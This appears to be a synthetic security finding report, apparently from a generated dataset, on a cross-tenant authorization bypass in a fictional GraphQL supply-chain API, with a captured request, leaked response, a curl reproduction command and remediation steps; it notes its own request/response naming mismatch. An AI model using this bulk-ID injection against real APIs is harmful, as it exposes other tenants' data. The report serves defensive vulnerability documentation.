# Security Analysis Report
**System:** TraceOrigin Supply API
**Domain:** Food & Beverage / Supply Chain Traceability
**Example ID:** GQL-0279
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.1 | Authorization-bypass injection on `bulkResourceLookup` / `getResource` — attacker reads supply chain records via bulk ID injection |

---

## Finding 1 — Injection: Authorization-Bypass Injection via Bulk ID Lookup (Pattern 5.1)

### Summary
The GraphQL API at `https://api.traceorigin-supply-a.example.com/graphql` exposes a `bulkResourceLookup` resolver that accepts a list of IDs from the client without verifying each ID belongs to the authenticated tenant. This enables authorization-bypass injection — by injecting resource IDs belonging to another tenant (`tenant-eec7`), the attacker reads supply traceability records.

**Context.txt inconsistency (documented):** The HAR request uses `bulkResourceLookup(ids: ["R-2279","R-1279","R-3279"])`, while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-308eeec7` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 5.1 — Authorization-bypass injection (Injection)
**Affected endpoint:** `POST https://api.traceorigin-supply-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (bulk injection)**
```
POST https://api.traceorigin-supply-a.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2279\", \"R-1279\", \"R-3279\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Victim Supply Chain Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-eec7",
      "ownerId": "other-user-308eeec7",
      "data": {
        "sensitiveField": "CONFIDENTIAL-308eeec7",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.traceorigin-supply-a.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2279\",\"R-1279\",\"R-3279\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-eec7, sensitiveField: CONFIDENTIAL-308eeec7
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must filter bulk IDs to only those belonging to the authenticated tenant before execution.
2. Redis cache key must include tenant dimension.
3. Enforce per-ID ownership check server-side; do not trust client-supplied ID arrays.
